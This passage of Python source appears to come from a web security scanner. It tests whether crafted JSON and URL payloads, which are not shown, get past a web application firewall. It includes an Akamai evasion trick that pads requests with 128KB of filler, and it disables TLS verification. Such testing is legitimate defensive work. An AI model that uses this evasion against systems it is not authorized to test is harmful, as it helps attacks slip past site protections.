            for category, payloads in bypass_payloads.items():
                if category == "json_payloads":
                    # Test JSON payloads via POST
                    for payload_str in payloads[:3]:
                        try:
                            payload = json.loads(payload_str)
                            resp = self.session.post(
                                target_url, json=payload, timeout=5, verify=False
                            )
                            if resp.status_code < 400:
                                # Double check marker reflection
                                if marker in resp.text:
                                    findings.append(
                                        {
                                            "type": "waf_bypass",
                                            "method": f"JSON_{category}",
                                            "payload": payload_str[:50],
                                            "severity": "HIGH",
                                        }
                                    )
                                    print(
                                        f"{Colors.WARNING}[!] WAF Bypass via JSON: {category}{Colors.ENDC}"
                                    )
                        except Exception:
                            pass
                else:
                    # Test URL payloads (removed limits to test advanced_evasion_2025)
                    for payload in payloads:
                        try:
                            # 1. Standard Payload
                            test_url = target_url + payload
                            
                            # 2. Akamai ASE Garbage Padding Bypass (128KB padding)
                            garbage_padding = "&garbage=" + ("A" * 128000)
                            test_url_padded = test_url + garbage_padding
                            
                            for t_url, bypass_type in [(test_url, category), (test_url_padded, f"{category}_Akamai_Garbage_Pad")]:
                                resp = self.session.get(t_url, timeout=5, verify=False)
                                if resp.status_code < 400:
                                    if marker in resp.text:
                                        findings.append(
                                            {
                                                "type": "waf_bypass",
                                                "method": f"URL_{bypass_type}",
                                                "payload": payload[:50],
                                                "severity": "HIGH",
                                            }
                                        )
                                        print(
                                            f"{Colors.WARNING}[!] WAF Bypass via URL ({bypass_type}){Colors.ENDC}"
                                        )
                                        break  # Don't double report if standard bypasses WAF
                        except Exception:
                            pass
        except Exception as e:
            print(
                f"{Colors.WARNING}[⚠] WAF bypass testing error: {str(e)[:50]}{Colors.ENDC}"
            )

        if not findings:
            print(f"{Colors.GREEN}[✓] No WAF bypass detected{Colors.ENDC}")
        return findings
